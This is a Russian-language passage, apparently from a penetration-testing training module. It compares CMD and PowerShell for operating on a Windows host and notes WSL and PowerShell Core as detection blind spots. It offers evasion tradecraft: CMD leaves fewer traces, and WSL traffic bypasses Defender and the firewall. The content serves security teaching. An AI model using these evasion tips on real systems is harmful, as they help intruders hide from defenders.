Оболочка CMD — это оригинальная оболочка MS-DOS, встроенная в Windows. Она была создана для базового взаимодействия и ИТ-операций на хосте. Некоторая простая автоматизация могла быть достигнута с помощью пакетных файлов, но на этом всё и заканчивалось. PowerShell появился с целью расширения возможностей CMD. PowerShell понимает собственные команды MS-DOS, используемые в CMD, и совершенно новый набор команд на основе .NET. В PowerShell также можно интегрировать новые самодостаточные модули с помощью командлетов. Командная строка CMD работает с текстовым вводом и выводом, в то время как PowerShell использует объекты .NET для всего ввода и вывода. Ещё одним важным моментом является то, что CMD не хранит записи команд, используемых во время сеанса, в отличие от PowerShell. Поэтому, в контексте скрытности, выполнение команд с помощью CMD оставит меньше следов на хосте. Другие потенциальные проблемы, такие как `Execution Policy`и , `User Account Control (UAC)`могут препятствовать выполнению команд и скриптов на хосте. Эти соображения влияют на `PowerShell`, но не на CMD. Ещё одним важным фактором, который следует учитывать, является возраст хоста. Если вы используете Windows XP или более старую версию (да, это всё ещё возможно...), PowerShell отсутствует, поэтому единственным вариантом останется командная строка (cmd). PowerShell появился только в Windows 7. Итак, подводя итог:

Использовать, `CMD`когда:

- Вы используете устаревшую версию PowerShell, которая, возможно, в ней отсутствует.
- Когда вам требуется лишь простое взаимодействие/доступ к хосту.
- Когда вы планируете использовать простые пакетные файлы, сетевые команды или собственные инструменты MS-DOS.
- Когда вы считаете, что политики выполнения могут повлиять на вашу возможность запускать скрипты или другие действия на хосте.

Использовать, `PowerShell`когда:

- Вы планируете использовать командлеты или другие пользовательские скрипты.
- Когда вам нужно взаимодействовать с объектами .NET, а не с текстовым выводом.
- Когда скрытность имеет меньшее значение.
- Если вы планируете взаимодействовать с облачными сервисами и хостами.
- Если ваши скрипты задают и используют псевдонимы.

---

## WSL и PowerShell для Linux

Подсистема Windows для Linux (WSL) — это мощный новый инструмент, появившийся на хостах Windows и предоставляющий виртуальную среду Linux, встроенную в вашу систему. Мы упоминаем об этом, потому что быстро меняющийся ландшафт операционных систем вполне может открыть новые способы получения доступа к хосту. При написании этого модуля мы обнаружили несколько примеров вредоносного ПО, пытавшегося использовать Python3 и бинарные файлы Linux для загрузки и установки полезных нагрузок на хост Windows через WSL. Как и в этой статье [,](https://www.bleepingcomputer.com/news/security/new-malware-uses-windows-subsystem-for-linux-for-stealthy-attacks/) злоумышленники также используют встроенные библиотеки Python, являющиеся родными для Windows и Linux, а также PowerShell для выполнения других действий на хосте. Следует также отметить, что в настоящее время любые сетевые запросы или функции, выполняемые к экземпляру WSL или от него, не обрабатываются брандмауэром Windows и Windows Defender, что делает его своего рода «слепой зоной» на хосте.

Те же проблемы в настоящее время можно обнаружить и в PowerShell Core, который можно установить на операционные системы Linux и который переносит многие стандартные функции PowerShell. Эти две концепции исключительно коварны, поскольку на сегодняшний день мало что известно о векторах атак или способах их обнаружения. Однако было замечено, что атаки, направленные на эти функции, обходят механизмы обнаружения антивирусов и EDR. Эти концепции несколько сложны для данного модуля, но мы рассмотрим их в одном из будущих модулей.